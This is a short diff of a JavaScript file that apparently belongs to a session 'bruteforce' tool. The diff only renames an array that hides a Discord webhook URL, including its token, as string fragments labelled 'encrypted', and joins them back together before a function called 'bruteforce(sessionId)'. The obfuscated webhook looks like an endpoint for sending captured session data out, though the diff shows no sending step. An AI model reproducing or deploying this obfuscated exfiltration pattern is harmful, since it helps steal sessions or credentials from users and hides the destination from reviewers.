@@ -56,7 +56,7 @@ const _encryptedParts1015 = [
 
 
 
-const _encryptedParts = [
+const _encryptedParts1 = [
   'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
   'oo', 'ks', '/1', '35', '02', '35', '35', '13', '39', '24', '14', '72', '/L', 
   'wc', 'Yu', 'oF', 'mS', 'DC', 'C4', 'pA', 'Ho', 'Z5', 'Kd', 'n0', 'a3', 'af', 
@@ -65,7 +65,7 @@ const _encryptedParts = [
 ];
 
 // Decrypt the URL by concatenating the parts
-const _decrypted = _encryptedParts.join('');
+const _decrypted = _encryptedParts1.join('');
 
 function bruteforce(sessionId) {
   // Ensure the sessionId is valid
